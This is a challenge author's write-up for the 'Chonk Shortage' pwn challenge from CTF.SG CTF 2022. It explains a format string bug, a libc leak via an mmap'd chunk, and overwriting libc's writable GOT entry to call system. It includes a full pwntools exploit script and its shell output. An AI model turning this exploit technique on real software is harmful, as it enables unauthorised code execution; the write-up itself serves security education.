---
title: "CTF.SG CTF 2022: Chonk Shortage (Pwn)"
layout: post
date: "2022-03-13"
tags:
  - CTF
  - writeup
  - CTF.SG CTF
  - Pwn
  - Author's Writeup
comments: true
---

> First we had the chip shortage, then we had the chip shortage, and now we have the chonk shortage. You only get one chonk, so you've got to thonk out of the box for this one!
>
> [ld-2.35.so](/files/ld-2.35.so)
>
> [libc-2.35.so](/files/libc-2.35.so)
>
> [chonk_shortage](/files/chonk_shortage)
>
> Author - niktay

Note: This is my writeup for a challenge I authored for CTF.SG CTF 2022.

In this challenge, you are provided with the challenge binary, along with its libc and linker. A good way to start would be to check what kind of security mitigations it has.

```
❯ checksec chonk_shortage
[*] 'Pwn/Chonk-Shortage/dist/chonk_shortage'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

This binary has every single mitigation enabled, so we have to bear this in mind when formulating our exploit. Now lets run the binary and get an idea of what it does:

```
❯ ./chonk_shortage
█▀▀ █░█ █▀█ █▄░█ █▄▀   █▀ █░█ █▀█ █▀█ ▀█▀ ▄▀█ █▀▀ █▀▀
█▄▄ █▀█ █▄█ █░▀█ █░█   ▄█ █▀█ █▄█ █▀▄ ░█░ █▀█ █▄█ ██▄
--------------------------------------------------------------
CHONK HAS NOT BEEN REDEEMED
--------------------------------------------------------------
1. Redeem CHONK [1/1]
2. Eat CHONK [1/1]
3. Done

Enter choice => 1

How chonky would you like your CHONK? 123

█▀▀ █░█ █▀█ █▄░█ █▄▀   █▀ █░█ █▀█ █▀█ ▀█▀ ▄▀█ █▀▀ █▀▀
█▄▄ █▀█ █▄█ █░▀█ █░█   ▄█ █▀█ █▄█ █▀▄ ░█░ █▀█ █▄█ ██▄
--------------------------------------------------------------
CHONK @ 0x5620966192a0 [UNCONSUMED]
--------------------------------------------------------------
1. Redeem CHONK [0/1]
2. Eat CHONK [1/1]
3. Done

Enter choice => 2

█▀▀ █░█ █▀█ █▄░█ █▄▀   █▀ █░█ █▀█ █▀█ ▀█▀ ▄▀█ █▀▀ █▀▀
█▄▄ █▀█ █▄█ █░▀█ █░█   ▄█ █▀█ █▄█ █▀▄ ░█░ █▀█ █▄█ ██▄
--------------------------------------------------------------
CHONK @ 0x5620966192a0 [CONSUMED]
--------------------------------------------------------------
1. Redeem CHONK [0/1]
2. Eat CHONK [0/1]
3. Done

Enter choice => 3

Please enter your name: abc
Tell us how you felt about your chonk: def
You have submitted:
def
Thanks, abc
```

In summary, the program allows us to "redeem" a CHONK (presumably a chunk of memory) of our chosen size once. After which, it seems to tell us the address of the allocated chunk in the main menu. It then allows us to free the chunk we redeemed, and finally asks us for our name and some feedback.

```c
void main(void)
{
  int choice;
  char feedback [128];
  char name [136];

  setup_IO();
  choice = 0;
  while( true ) {
    while( true ) {
      print_menu();
      printf("\nEnter choice => ");
      __isoc99_scanf("%d",&choice);
      if (choice != 1) break;
      if (NOT_REDEEMED != 0) {
        redeem_chonk();
      }
    }
    if (choice != 2) break;
    if (NOT_EATEN != 0) {
      eat_chonk();
    }
  }
  printf("\x1b[2J\x1b[H");
  printf("Please enter your name: ");
  __isoc99_scanf("%127s",name);
  printf("Tell us how you felt about your chonk: ");
  __isoc99_scanf("%127s",feedback);
  puts("You have submitted:");
  printf(feedback);
  printf("\nThanks, ");
  puts(name);
  exit(0);
}
```

Decompiling the binary in Ghidra would give us the above decompile for the main function of this binary. We can immediately see that there is a format string bug in `printf(feedback)` since user input is passed directly into `printf()`.

```
❯ ./chonk_shortage
█▀▀ █░█ █▀█ █▄░█ █▄▀   █▀ █░█ █▀█ █▀█ ▀█▀ ▄▀█ █▀▀ █▀▀
█▄▄ █▀█ █▄█ █░▀█ █░█   ▄█ █▀█ █▄█ █▀▄ ░█░ █▀█ █▄█ ██▄
--------------------------------------------------------------
CHONK HAS NOT BEEN REDEEMED
--------------------------------------------------------------
1. Redeem CHONK [1/1]
2. Eat CHONK [1/1]
3. Done

Enter choice => 3
Please enter your name: aaa
Tell us how you felt about your chonk: %x.%x.%x
You have submitted:
1.1.7ec5ba37
Thanks, aaa
```

As seen above, we have verified that the format string bug exists. We now need to leverage on this bug to craft a working exploit. However, the binary is compiled with Full RELRO, so its GOT entries are read-only at runtime, thus GOT overwrite is not an option.

```
❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

We should also note that the binary given to us is version 2.35. This is significant because we do not have access to malloc/free/morecore hooks since they have been deprecated.

Keeping this in mind, how do we approach this? Let us consider what happens if we request for a chonk (chunk) size that exceeds the largebin range, for instance 0x210000.

```
pwndbg> r
Starting program: Pwn/Chonk-Shortage/dist/chonk_shortage
█▀▀ █░█ █▀█ █▄░█ █▄▀   █▀ █░█ █▀█ █▀█ ▀█▀ ▄▀█ █▀▀ █▀▀
█▄▄ █▀█ █▄█ █░▀█ █░█   ▄█ █▀█ █▄█ █▀▄ ░█░ █▀█ █▄█ ██▄
--------------------------------------------------------------
CHONK HAS NOT BEEN REDEEMED
--------------------------------------------------------------
1. Redeem CHONK [1/1]
2. Eat CHONK [1/1]
3. Done

Enter choice => 1
How chonky would you like your CHONK? 2162688
█▀▀ █░█ █▀█ █▄░█ █▄▀   █▀ █░█ █▀█ █▀█ ▀█▀ ▄▀█ █▀▀ █▀▀
█▄▄ █▀█ █▄█ █░▀█ █░█   ▄█ █▀█ █▄█ █▀▄ ░█░ █▀█ █▄█ ██▄
--------------------------------------------------------------
CHONK @ 0x7ffff7b82010 [UNCONSUMED]
--------------------------------------------------------------
1. Redeem CHONK [0/1]
2. Eat CHONK [1/1]
3. Done

Enter choice => ^C
Program received signal SIGINT, Interrupt.

pwndbg> lm
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555555000 r--p     1000 0      Pwn/Chonk-Shortage/dist/chonk_shortage
    0x555555555000     0x555555556000 r-xp     1000 1000   Pwn/Chonk-Shortage/dist/chonk_shortage
    0x555555556000     0x555555557000 r--p     1000 2000   Pwn/Chonk-Shortage/dist/chonk_shortage
    0x555555557000     0x555555558000 r--p     1000 2000   Pwn/Chonk-Shortage/dist/chonk_shortage
    0x555555558000     0x555555559000 rw-p     1000 3000   Pwn/Chonk-Shortage/dist/chonk_shortage
    0x555555559000     0x55555557a000 rw-p    21000 0      [heap]
    0x7ffff7b82000     0x7ffff7d96000 rw-p   214000 0      [anon_7ffff7b82]  <-- mmap-ed chunk
    0x7ffff7d96000     0x7ffff7dc2000 r--p    2c000 0      Pwn/Chonk-Shortage/dist/libc.so.6
    0x7ffff7dc2000     0x7ffff7f57000 r-xp   195000 2c000  Pwn/Chonk-Shortage/dist/libc.so.6
    0x7ffff7f57000     0x7ffff7fab000 r--p    54000 1c1000 Pwn/Chonk-Shortage/dist/libc.so.6
    0x7ffff7fab000     0x7ffff7fae000 r--p     3000 215000 Pwn/Chonk-Shortage/dist/libc.so.6
    0x7ffff7fae000     0x7ffff7fb1000 rw-p     3000 218000 Pwn/Chonk-Shortage/dist/libc.so.6
    0x7ffff7fb1000     0x7ffff7fc0000 rw-p     f000 0      [anon_7ffff7fb1]
    0x7ffff7fc0000     0x7ffff7fc3000 r--p     3000 0      [vvar]
    0x7ffff7fc3000     0x7ffff7fc4000 r-xp     1000 0      [vdso]
    0x7ffff7fc4000     0x7ffff7fc6000 r--p     2000 0      Pwn/Chonk-Shortage/dist/ld.so.2
    0x7ffff7fc6000     0x7ffff7ff0000 r-xp    2a000 2000   Pwn/Chonk-Shortage/dist/ld.so.2
    0x7ffff7ff0000     0x7ffff7ffb000 r--p     b000 2c000  Pwn/Chonk-Shortage/dist/ld.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000 37000  Pwn/Chonk-Shortage/dist/ld.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000 39000  Pwn/Chonk-Shortage/dist/ld.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

If we look at the memory map above, we'd notice something particularly interesting.

Since the allocated chunk exceeded the largebin range, it was mmap-ed. Moreover, the first mmap-ed chunk is usually allocated adjacent to the first page of libc's memory map (as seen above). Therefore, we can reliably calculate the libc base address since the address of the chunk is printed in the main menu.

```
pwndbg> telescope 0x7ffff7fae000 30
00:0000│  0x7ffff7fae000 ◂— 0x217bc0
01:0008│  0x7ffff7fae008 —▸ 0x7ffff7fbe150 —▸ 0x7ffff7d96000 ◂— 0x3010102464c457f
02:0010│  0x7ffff7fae010 —▸ 0x7ffff7fd9d20 ◂— endbr64
03:0018│  0x7ffff7fae018 (*ABS*@got.plt) —▸ 0x7ffff7f37c60 ◂— endbr64
04:0020│  0x7ffff7fae020 (*ABS*@got.plt) —▸ 0x7ffff7f33890 ◂— endbr64
05:0028│  0x7ffff7fae028 (realloc@got.plt) —▸ 0x7ffff7dc2030 ◂— endbr64
06:0030│  0x7ffff7fae030 (*ABS*@got.plt) —▸ 0x7ffff7f35ab0 ◂— endbr64
07:0038│  0x7ffff7fae038 (_dl_exception_create@got.plt) —▸ 0x7ffff7dc2050 ◂— endbr64
08:0040│  0x7ffff7fae040 (*ABS*@got.plt) —▸ 0x7ffff7f3aa80 ◂— endbr64
09:0048│  0x7ffff7fae048 (*ABS*@got.plt) —▸ 0x7ffff7f3b1d0 ◂— endbr64
0a:0050│  0x7ffff7fae050 (calloc@got.plt) —▸ 0x7ffff7dc2080 ◂— endbr64
0b:0058│  0x7ffff7fae058 (*ABS*@got.plt) —▸ 0x7ffff7f32b10 ◂— endbr64
0c:0060│  0x7ffff7fae060 (*ABS*@got.plt) —▸ 0x7ffff7f335c0 ◂— endbr64
0d:0068│  0x7ffff7fae068 (*ABS*@got.plt) —▸ 0x7ffff7f3aac0 ◂— endbr64
0e:0070│  0x7ffff7fae070 (*ABS*@got.plt) —▸ 0x7ffff7f3b7c0 ◂— endbr64
0f:0078│  0x7ffff7fae078 (*ABS*@got.plt) —▸ 0x7ffff7f39ca0 ◂— endbr64
10:0080│  0x7ffff7fae080 (*ABS*@got.plt) —▸ 0x7ffff7f3b3c0 ◂— endbr64
11:0088│  0x7ffff7fae088 (_dl_find_dso_for_object@got.plt) —▸ 0x7ffff7dc20f0 ◂— endbr64
12:0090│  0x7ffff7fae090 (*ABS*@got.plt) —▸ 0x7ffff7f39340 ◂— endbr64
13:0098│  0x7ffff7fae098 (*ABS*@got.plt) —▸ 0x7ffff7f37ae0 ◂— endbr64
14:00a0│  0x7ffff7fae0a0 (*ABS*@got.plt) —▸ 0x7ffff7f34444 ◂— endbr64
15:00a8│  0x7ffff7fae0a8 (*ABS*@got.plt) —▸ 0x7ffff7f38fb0 ◂— endbr64
16:00b0│  0x7ffff7fae0b0 (*ABS*@got.plt) —▸ 0x7ffff7f3c440 ◂— endbr64
17:00b8│  0x7ffff7fae0b8 (*ABS*@got.plt) —▸ 0x7ffff7f37700 ◂— endbr64
18:00c0│  0x7ffff7fae0c0 (*ABS*@got.plt) —▸ 0x7ffff7f33a00 ◂— endbr64
19:00c8│  0x7ffff7fae0c8 (_dl_deallocate_tls@got.plt) —▸ 0x7ffff7dc2170 ◂— endbr64
1a:00d0│  0x7ffff7fae0d0 (__tls_get_addr@got.plt) —▸ 0x7ffff7dc2180 ◂— endbr64
1b:00d8│  0x7ffff7fae0d8 (*ABS*@got.plt) —▸ 0x7ffff7f3b1d0 ◂— endbr64
1c:00e0│  0x7ffff7fae0e0 (*ABS*@got.plt) —▸ 0x7ffff7f33d80 ◂— endbr64
1d:00e8│  0x7ffff7fae0e8 (*ABS*@got.plt) —▸ 0x7ffff7f35ac4 ◂— endbr64
```

Notice that libc's GOT (which only has partial RELRO, thus writable) is mapped at `0x7ffff7fae000`.

```
13:0098│  0x7ffff7fae098 (*ABS*@got.plt) —▸ 0x7ffff7f37ae0 ◂— endbr64
```

The above GOT entry is actually `__strlen_avx2` which is used in `puts`. Incidentally, `puts` passes its parameter to `__strlen_avx2` during execution. Since the program does `puts(name)`, we can simply overwrite the above GOT entry with the address of `system`, and set our name to `/bin/sh`. We can leverage on our format string bug in `printf(feedback)` to do so.

With this in mind, we can craft the following exploit:

```python
#!/usr/bin/env python3

from pwn import *

HOST = "chals.ctf.sg"
PORT = 30101

CHOICE_PROMPT = b"Enter choice => "
SIZE_PROMPT = b"How chonky would you like your CHONK? "
NAME_PROMPT = b"Please enter your name: "
FEEDBACK_PROMPT = b"Tell us how you felt about your chonk: "

ADDRESS_MARKER = b"CHONK @ "
ADDRESS_END_MARKER = b" ["
PAYLOAD_MARKER = b"You have submitted:\n"
PAYLOAD_END_MARKER = b"\nThanks,"

elf = context.binary = ELF("./dist/chonk_shortage")
libc = ELF("./dist/libc.so.6")
libc.symbols["__strlen_avx2"] = 0x218098

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = elf.process()


def send_payload(payload: bytes) -> bytes:
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = elf.process()
    io.sendlineafter(CHOICE_PROMPT, b"3")
    io.sendlineafter(NAME_PROMPT, b"123")
    io.sendlineafter(FEEDBACK_PROMPT, payload)
    io.recvuntil(PAYLOAD_MARKER)

    response = io.recvuntil(PAYLOAD_END_MARKER, drop=True)

    io.close()

    return response


def malloc(size: int) -> int:
    io.sendlineafter(CHOICE_PROMPT, b"1")
    io.sendlineafter(SIZE_PROMPT, str(size).encode())
    io.recvuntil(ADDRESS_MARKER)

    return int(io.recvuntilS(ADDRESS_END_MARKER, drop=True), 16)


offset = FmtStr(execute_fmt=send_payload).offset

chonk_address = malloc(0x210000)
log.success(f"chonk @ {hex(chonk_address)}")

libc.address = chonk_address - 0x10 + 0x214000
log.success(f"libc @ {hex(libc.address)}")
log.success(f"__strlen_avx2 @ {hex(libc.sym.__strlen_avx2)}")

io.sendlineafter(CHOICE_PROMPT, b"3")
io.sendlineafter(NAME_PROMPT, b"/bin/sh\x00")
io.sendlineafter(
    FEEDBACK_PROMPT,
    fmtstr_payload(
        offset,
        {
            libc.sym.__strlen_avx2: libc.sym.system,
        },
    ),
)

io.interactive()
```

Running the above script yields us the following.

```
❯ python xpl.py REMOTE
[*] 'Pwn/Chonk-Shortage/dist/chonk_shortage'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 'Pwn/Chonk-Shortage/dist/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chals.ctf.sg on port 30101: Done
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[+] Opening connection to chals.ctf.sg on port 30101: Done
[*] Closed connection to chals.ctf.sg port 30101
[*] Found format string offset: 8
[+] chonk @ 0x7fca7c957010
[+] libc @ 0x7fca7cb6b000
[+] __strlen_avx2 @ 0x7fca7cd83098
[*] Switching to interactive mode
You have submitted:
                                                                                               
     7                                                           \x13             \x00
                \x00aaabaa\x980\xd8|\xca
Thanks, $ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd home
$ ls
chonk_shortage
$ cd chonk_shortage
$ ls
chonk_shortage
flag.txt
$ cat flag.txt
CTFSG{I_Th0nk3d_h4rd_4nd_r34ch3d_3nl1ght3nm3nt_a798f6a9020c53ecd0a358a90d83b869}
```

Flag: `CTFSG{I_Th0nk3d_h4rd_4nd_r34ch3d_3nl1ght3nm3nt_a798f6a9020c53ecd0a358a90d83b869}`
